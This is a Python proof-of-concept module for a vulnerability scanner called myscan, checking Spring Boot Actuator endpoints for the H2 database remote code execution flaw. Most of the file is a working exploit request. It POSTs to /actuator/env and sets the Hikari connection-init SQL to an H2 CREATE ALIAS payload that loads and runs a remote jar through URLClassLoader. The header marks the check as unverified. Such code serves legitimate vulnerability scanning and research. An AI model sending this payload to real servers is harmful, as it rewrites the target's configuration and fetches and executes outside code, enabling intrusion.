# !/usr/bin/env python3
# @Time    : 2020/9/18
# @Author  : caicai
# @File    : poc_springboot_h2_db_rce_2020.py

'''
未验证
'''
# Payload taken from @pyn3rd (Twitter), see reference[2].

# References:
# - [1] https://spaceraccoon.dev/remote-code-execution-in-three-acts-chaining-exposed-actuators-and-h2-database
# - [2] https://twitter.com/pyn3rd/status/1305151887964946432
# - [3] https://www.veracode.com/blog/research/exploiting-spring-boot-actuators
# - [4] https://github.com/spaceraccoon/spring-boot-actuator-h2-rce


from myscan.lib.parse.response_parser import response_parser  ##写了一些操作resonse的方法的类
from myscan.lib.helper.request import request  # 修改了requests.request请求的库，建议使用此库，会在redis计数
from myscan.config import scan_set


class POC():
    def __init__(self, workdata):
        self.dictdata = workdata.get("dictdata")  # python的dict数据，详情请看docs/开发指南Example dict数据示例
        self.url = workdata.get("data")  # self.url为需要测试的url，值为目录url，会以/结尾,如https://www.baidu.com/home/ ,为目录
        self.result = []  # 此result保存dict数据，dict需包含name,url,level,detail字段，detail字段值必须为dict。如下self.result.append代码
        self.name = "springboot_h2_db_rce"
        self.vulmsg = "link : https://github.com/spaceraccoon/spring-boot-actuator-h2-rce"
        self.level = 2  # 0:Low  1:Medium 2:High

    def verify(self):
        # 根据config.py 配置的深度，限定一下目录深度
        if self.url.count("/") > int(scan_set.get("max_dir", 2)) + 2:
            return
        req = {
            "method": "POST",
            "url": self.url + "actuator/env",
            "headers": {
                "Content-Type": "application/json"
            },
            "data":'''{
        "name": "spring.datasource.hikari.connection-init-sql",
        "value":"CREATE ALIAS remoteUrl AS $$ import java.net.*;@CODE String remoteUrl() throws Exception { Class.forName(\"pop\", true, new URLClassLoader(new URL[]{new URL(\"http://127.0.0.1:9001/pop.jar\")})).newInstance();return null;}$$; CALL remoteUrl()"
      }''',
            "timeout": 10,
            "verify": False,
        }
        r = request(**req)
        if r is not None and r.status_code == 200 and b"spring.datasource.hikari.connection-init-sql" in r.content and "application/vnd.spring-boot.actuator" in str(r.headers):
            parser_ = response_parser(r)
            self.result.append({
                "name": self.name,
                "url": self.url,
                "level": self.level,  # 0:Low  1:Medium 2:High
                "detail": {
                    "vulmsg": self.vulmsg,
                    "request": parser_.getrequestraw(),
                    "response": parser_.getresponseraw()
                }
            })
